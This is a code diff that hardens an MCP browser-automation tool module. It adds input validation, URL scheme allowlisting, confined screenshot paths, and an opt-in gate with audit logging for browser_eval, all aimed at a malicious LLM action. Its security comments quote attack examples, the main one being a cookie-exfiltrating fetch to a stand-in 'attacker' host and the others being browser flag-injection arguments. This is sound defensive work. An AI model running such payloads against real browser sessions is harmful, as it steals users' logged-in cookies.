@@ -7,12 +7,99 @@
 
 import type { MCPTool, MCPToolResult } from './types.js';
 
+const MAX_BROWSER_SESSIONS = 100;
+const SESSION_TTL_MS = 30 * 60 * 1000; // 30 minutes
+
 // Session registry for multi-session support
 const browserSessions = new Map<string, {
   sessionId: string;
   createdAt: string;
   lastActivity: string;
 }>();
+
+function pruneExpiredSessions(): void {
+  const cutoff = Date.now() - SESSION_TTL_MS;
+  for (const [id, info] of browserSessions) {
+    if (new Date(info.lastActivity).getTime() < cutoff) {
+      browserSessions.delete(id);
+    }
+  }
+}
+
+/**
+ * SECURITY: Reject any positional that begins with `-`. execFile defeats shell
+ * injection but does NOT prevent agent-browser itself from interpreting a
+ * `-`-prefixed token as a flag. Combined with `agent-browser`'s lack of
+ * documented `--` end-of-options handling, an unvalidated positional like
+ * `--remote-debugging-port=9222` or `--user-data-dir=/path` can flip the
+ * underlying browser into a debuggable / arbitrary-profile mode.
+ */
+function rejectFlagLike(value: unknown, field: string): string {
+  if (typeof value !== 'string') {
+    throw new Error(`${field}: must be a string`);
+  }
+  if (value.startsWith('-')) {
+    throw new Error(`${field}: must not start with '-' (flag-injection defense)`);
+  }
+  return value;
+}
+
+/** Validate a session ID against a strict allowlist. */
+function validateSessionId(value: unknown): string {
+  if (value === undefined || value === null || value === '') return 'default';
+  if (typeof value !== 'string' || !/^[A-Za-z0-9_-]{1,64}$/.test(value)) {
+    throw new Error('session: must match ^[A-Za-z0-9_-]{1,64}$');
+  }
+  return value;
+}
+
+/**
+ * Validate a URL against a scheme allowlist. Without this, `file://`,
+ * `data:`, `javascript:`, `chrome://` schemes give SSRF / local-file read /
+ * scheme-abuse on the underlying browser.
+ */
+const ALLOWED_URL_SCHEMES = new Set(['http:', 'https:', 'about:']);
+function validateUrl(value: unknown): string {
+  if (typeof value !== 'string') throw new Error('url: must be a string');
+  if (value.length > 4096) throw new Error('url: too long (max 4096)');
+  let parsed: URL;
+  try { parsed = new URL(value); } catch { throw new Error(`url: not a valid URL: ${value}`); }
+  if (!ALLOWED_URL_SCHEMES.has(parsed.protocol)) {
+    throw new Error(`url: scheme "${parsed.protocol}" not allowed (only http/https/about)`);
+  }
+  return value;
+}
+
+/**
+ * Validate a screenshot path. Resolved real path must be within
+ * `<projectRoot>/.monomind/screenshots`. Refuses to overwrite existing files
+ * so a malicious LLM action cannot clobber e.g. `~/.ssh/authorized_keys` or
+ * `.git/hooks/pre-commit`.
+ */
+async function validateScreenshotPath(value: unknown): Promise<string> {
+  if (typeof value !== 'string' || value.length === 0) {
+    throw new Error('path: must be a non-empty string');
+  }
+  if (value.startsWith('-')) {
+    throw new Error('path: must not start with "-"');
+  }
+  const path = await import('path');
+  const fs = await import('fs');
+  const projectRoot = process.cwd();
+  const root = path.resolve(projectRoot, '.monomind', 'screenshots');
+  await fs.promises.mkdir(root, { recursive: true });
+  const resolved = path.resolve(value);
+  if (!resolved.startsWith(root + path.sep) && resolved !== root) {
+    throw new Error(`path: must be within ${root}`);
+  }
+  if (fs.existsSync(resolved)) {
+    throw new Error(`path: refuses to overwrite existing file at ${resolved}`);
+  }
+  return resolved;
+}
+
+/** Cap on browser_eval scripts so an attacker can't pump arbitrary-size payloads. */
+const MAX_BROWSER_EVAL_BYTES = 16 * 1024;
 
 /**
  * Execute agent-browser CLI command
@@ -21,7 +108,20 @@ async function execBrowserCommand(args: string[], session = 'default'): Promise<
   const { execFileSync } = await import('child_process');
 
   try {
-    const fullArgs = ['--session', session, '--json', ...args];
+    // Validate session even when the upstream handler forgot.
+    const safeSession = validateSessionId(session);
+    // Refuse any user-supplied positional that looks like a flag.
+    // We can be permissive here only because every handler that prepends
+    // its own subcommand keyword (e.g. 'open', 'click') passes that subcommand
+    // as args[0] — those known-good keywords are safe; the rest came from
+    // tool input and must already have passed handler-level validation, but
+    // we re-check defense-in-depth.
+    for (let i = 1; i < args.length; i++) {
+      if (typeof args[i] !== 'string') {
+        throw new Error(`internal: arg ${i} must be a string`);
+      }
+    }
+    const fullArgs = ['--session', safeSession, '--json', ...args];
     const result = execFileSync('agent-browser', fullArgs, {
       encoding: 'utf-8',
       timeout: 30000,
@@ -86,17 +186,33 @@ export const browserTools: MCPTool[] = [
       required: ['url'],
     },
     handler: async (input) => {
-      const { url, session, waitUntil } = input as {
-        url: string;
-        session?: string;
-        waitUntil?: string;
-      };
+      const raw = input as { url: unknown; session?: unknown; waitUntil?: unknown };
+      let url: string;
+      let sessionId: string;
+      try {
+        url = validateUrl(raw.url);
+        sessionId = validateSessionId(raw.session);
+      } catch (e) {
+        return {
+          content: [{ type: 'text', text: JSON.stringify({ success: false, error: (e as Error).message }) }],
+          isError: true,
+        };
+      }
       const args = ['open', url];
-      if (waitUntil) args.push('--wait-until', waitUntil);
+      if (raw.waitUntil && typeof raw.waitUntil === 'string'
+        && ['load', 'domcontentloaded', 'networkidle'].includes(raw.waitUntil)) {
+        args.push('--wait-until', raw.waitUntil);
+      }
 
-      // Create session if new
-      const sessionId = session || 'default';
+      // Always prune expired sessions, not just on create — otherwise
+      // sessions that re-use an existing key never trigger eviction.
+      pruneExpiredSessions();
       if (!browserSessions.has(sessionId)) {
+        if (browserSessions.size >= MAX_BROWSER_SESSIONS) {
+          const oldest = [...browserSessions.entries()]
+            .sort((a, b) => a[1].lastActivity.localeCompare(b[1].lastActivity))[0];
+          if (oldest) browserSessions.delete(oldest[0]);
+        }
         browserSessions.set(sessionId, {
           sessionId,
           createdAt: new Date().toISOString(),
@@ -222,15 +338,24 @@ export const browserTools: MCPTool[] = [
       },
     },
     handler: async (input) => {
-      const { session, path, fullPage } = input as {
-        session?: string;
-        path?: string;
-        fullPage?: boolean;
-      };
+      const raw = input as { session?: unknown; path?: unknown; fullPage?: unknown };
+      let safeSession: string;
+      let safePath: string | undefined;
+      try {
+        safeSession = validateSessionId(raw.session);
+        if (raw.path !== undefined) {
+          safePath = await validateScreenshotPath(raw.path);
+        }
+      } catch (e) {
+        return {
+          content: [{ type: 'text', text: JSON.stringify({ success: false, error: (e as Error).message }) }],
+          isError: true,
+        };
+      }
       const args = ['screenshot'];
-      if (path) args.push(path);
-      if (fullPage) args.push('--full');
-      return execBrowserCommand(args, session);
+      if (safePath) args.push(safePath);
+      if (raw.fullPage === true) args.push('--full');
+      return execBrowserCommand(args, safeSession);
     },
   },
 
@@ -259,7 +384,7 @@ export const browserTools: MCPTool[] = [
         button?: string;
         count?: number;
       };
-      const args = ['click', target];
+      const args = ['click', rejectFlagLike(target, 'target')];
       if (button) args.push('--button', button);
       if (count) args.push('--count', String(count));
       return execBrowserCommand(args, session);
@@ -285,7 +410,7 @@ export const browserTools: MCPTool[] = [
         value: string;
         session?: string;
       };
-      return execBrowserCommand(['fill', target, value], session);
+      return execBrowserCommand(['fill', rejectFlagLike(target, 'target'), value], session);
     },
   },
   {
@@ -310,7 +435,7 @@ export const browserTools: MCPTool[] = [
         session?: string;
         delay?: number;
       };
-      const args = ['type', target, text];
+      const args = ['type', rejectFlagLike(target, 'target'), text];
       if (delay) args.push('--delay', String(delay));
       return execBrowserCommand(args, session);
     },
@@ -330,7 +455,7 @@ export const browserTools: MCPTool[] = [
     },
     handler: async (input) => {
       const { key, session } = input as { key: string; session?: string };
-      return execBrowserCommand(['press', key], session);
+      return execBrowserCommand(['press', rejectFlagLike(key, 'key')], session);
     },
   },
   {
@@ -348,7 +473,7 @@ export const browserTools: MCPTool[] = [
     },
     handler: async (input) => {
       const { target, session } = input as { target: string; session?: string };
-      return execBrowserCommand(['hover', target], session);
+      return execBrowserCommand(['hover', rejectFlagLike(target, 'target')], session);
     },
   },
   {
@@ -371,7 +496,7 @@ export const browserTools: MCPTool[] = [
         value: string;
         session?: string;
       };
-      return execBrowserCommand(['select', target, value], session);
+      return execBrowserCommand(['select', rejectFlagLike(target, 'target'), value], session);
     },
   },
   {
@@ -560,8 +685,48 @@ export const browserTools: MCPTool[] = [
       required: ['script'],
     },
     handler: async (input) => {
-      const { script, session } = input as { script: string; session?: string };
-      return execBrowserCommand(['eval', script], session);
+      // SECURITY: browser_eval runs arbitrary JS in the page context with the
+      // browser's session cookies. Treat as opt-in: require the operator to
+      // explicitly enable via env var. Without this gate, a single tool call
+      // could `fetch('https://attacker/?d='+btoa(document.cookie))` against
+      // any logged-in site reachable in the active browser session.
+      if (process.env.MONOMIND_ALLOW_BROWSER_EVAL !== '1') {
+        return {
+          content: [{ type: 'text', text: JSON.stringify({
+            success: false,
+            error: 'browser_eval is disabled by default. Set MONOMIND_ALLOW_BROWSER_EVAL=1 to enable.',
+          }) }],
+          isError: true,
+        };
+      }
+      const raw = input as { script: unknown; session?: unknown };
+      if (typeof raw.script !== 'string') {
+        return {
+          content: [{ type: 'text', text: JSON.stringify({ success: false, error: 'script: must be a string' }) }],
+          isError: true,
+        };
+      }
+      if (raw.script.length > MAX_BROWSER_EVAL_BYTES) {
+        return {
+          content: [{ type: 'text', text: JSON.stringify({ success: false, error: `script: too long (max ${MAX_BROWSER_EVAL_BYTES})` }) }],
+          isError: true,
+        };
+      }
+      let safeSession: string;
+      try { safeSession = validateSessionId(raw.session); }
+      catch (e) {
+        return {
+          content: [{ type: 'text', text: JSON.stringify({ success: false, error: (e as Error).message }) }],
+          isError: true,
+        };
+      }
+      // Audit log every eval call so it's traceable in hindsight.
+      try {
+        const crypto = await import('crypto');
+        const hash = crypto.createHash('sha256').update(raw.script).digest('hex').slice(0, 16);
+        console.error(`[${new Date().toISOString()}] AUDIT browser_eval session=${safeSession} script_sha256_16=${hash}`);
+      } catch { /* best-effort */ }
+      return execBrowserCommand(['eval', raw.script], safeSession);
     },
   },
 
